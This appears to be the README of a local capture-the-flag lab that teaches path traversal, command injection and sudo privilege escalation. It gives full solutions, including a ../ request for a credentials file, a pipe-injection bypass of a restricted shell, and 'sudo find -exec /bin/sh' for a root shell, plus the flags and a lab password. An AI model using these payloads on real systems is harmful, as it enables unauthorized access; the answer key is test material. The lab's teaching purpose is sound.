# CyberXperience 2026: The Shell Chronicles

A beginner-friendly 3-stage security CTF challenge featuring Path Traversal, Command Injection, and Privilege Escalation.

## Quick Start

```bash
# Build and start all services
docker-compose up --build

# Access the CTF at http://localhost:3000
```

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                         Frontend (Next.js)                       │
│                         http://localhost:3000                    │
├─────────────────────────────────────────────────────────────────┤
│                              │                                   │
│         ┌────────────────────┼────────────────────┐              │
│         │                    │                    │              │
│         ▼                    ▼                    │              │
│  ┌──────────────┐    ┌──────────────┐             │              │
│  │ Web Traversal│    │   Gateway    │◄────────────┘              │
│  │   (Flask)    │    │  (Node.js)   │                            │
│  │  Port 5000   │    │  Port 4000   │                            │
│  └──────────────┘    └──────┬───────┘                            │
│                             │                                    │
│                             │ Docker API                         │
│                             ▼                                    │
│                      ┌──────────────┐                            │
│                      │Shell Backend │                            │
│                      │  (Ubuntu)    │                            │
│                      └──────────────┘                            │
└─────────────────────────────────────────────────────────────────┘
```

## Challenge Stages

### Stage 1: Information Disclosure (Path Traversal)

**Target:** Web Traversal API (`/api/files/<filename>`)

**Vulnerability:** The file path is not sanitized, allowing `../` sequences.

**Goal:** Read `/data/secrets/credentials.txt`

**Solution:**
```
GET /api/files/../../../data/secrets/credentials.txt
```

**Flag 1:** `FLAG{p4th_tr4v3rs4l_0pen_d00r}`

---

### Stage 2: Command Injection (Shell Escape)

**Target:** Restricted Shell

**Vulnerability:** The shell checks only the first command word but uses `shell=True`, allowing pipe operators.

**Goal:** Read `/home/ctf_user/flag2.txt`

**Solution:**
```bash
help | cat /home/ctf_user/flag2.txt
```

**Flag 2:** `FLAG{c0mm4nd_1nj3ct10n_p1p3_dr34m}`

---

### Stage 3: Privilege Escalation (GTFOBins)

**Target:** Root access via misconfigured sudo

**Vulnerability:** `ctf_user` can run `/usr/bin/find` as root without a password.

**Goal:** Read `/root/root_flag.txt`

**Solution:**
```bash
# First, discover the sudo permissions
help | sudo -l

# Use find's -exec to read the flag
help | sudo find /root -name root_flag.txt -exec cat {} \;

# Or spawn a root shell
help | sudo find . -exec /bin/sh \; -quit
```

**Flag 3:** `FLAG{gtf0_f1nd_r00t_4ccess_2026}`

---

## Credentials

Username: `ctf_user`
Password: `r3str1ct3d_2026`

(Discovered via Stage 1)

## Development

### Running in Development Mode

```bash
# Frontend (requires Node.js 18+)
cd frontend
npm install
npm run dev

# Gateway
cd gateway
npm install
npm run dev

# Services (require Docker)
docker-compose up web-traversal shell-backend
```

### File Structure

```
CyberXperience2026/
├── docker-compose.yml
├── frontend/                 # Next.js web interface
│   ├── app/
│   ├── components/
│   └── Dockerfile
├── gateway/                  # Socket.io terminal bridge
│   ├── server.js
│   └── Dockerfile
└── services/
    ├── web-traversal/        # Flask API (Stage 1)
    │   ├── app.py
    │   └── Dockerfile
    └── shell-backend/        # Ubuntu shell (Stage 2 & 3)
        ├── restricted_shell.py
        ├── ctf_user_sudoers
        └── Dockerfile
```

## Educational Notes

This CTF demonstrates three fundamental web/system vulnerabilities:

1. **Path Traversal** - Never trust user input for file paths. Always use secure path joining and validate paths stay within allowed directories.

2. **Command Injection** - Never pass user input to shell commands. Use parameterized commands or avoid shell execution entirely.

3. **Privilege Escalation** - Follow the principle of least privilege. Audit sudo permissions regularly and avoid allowing commands that can execute arbitrary code.

## License

Educational use only. Do not use these techniques against systems without authorization.
